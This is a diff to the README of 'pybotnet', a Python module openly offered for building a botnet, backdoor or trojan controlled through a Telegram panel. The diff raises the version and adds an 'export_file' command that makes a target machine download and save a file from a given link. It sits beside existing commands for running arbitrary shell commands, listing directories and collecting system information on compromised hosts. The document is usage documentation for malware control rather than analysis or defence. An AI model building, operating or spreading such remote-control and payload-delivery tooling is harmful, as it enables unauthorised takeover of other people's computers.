@@ -1,4 +1,4 @@
-# pybotnet  0.13
+# pybotnet  0.14
 
 A Python module for building [botnet ,backdoor or trojan] with Telegram control panel
 - [x] windows
@@ -61,9 +61,10 @@ while True:
 *If you want the command to run only on one system, write the MAC address of that system first:* \
  `66619484755211 get_info`
 
-COMMAND | Sample | DO THIS | Minimum version required | Works well on: |
+COMMAND | Sample | DO THIS | Minimum version required | tested on |
 --------|--------|---------|--------------------------|----------|
 `get_info` | `get_info` |return system info | 0.06 | windows, linux |
 `do_sleep \<scconds> \<message (Optional)>` | `do_sleep 99999 hi, i see you!` | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 | windows, linux |
 `cmd \<system command>` | `cmd mkdir new_folder` | run system command in shell or cmd (Be careful not to give endless command like `ping google.com -t`  in windows or `ping google.com` in linux)  TODO:add timeout| 0.07 | windows, linux|
 `ls \<route>` | `ls C:\ `,` ls /home` |Returns a list of folders and files in that path | 0.09 | windows, linux |
+`export_file \<download_link>` | `export https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` |target donwload this file and save to script path route| 0.14 | windows |
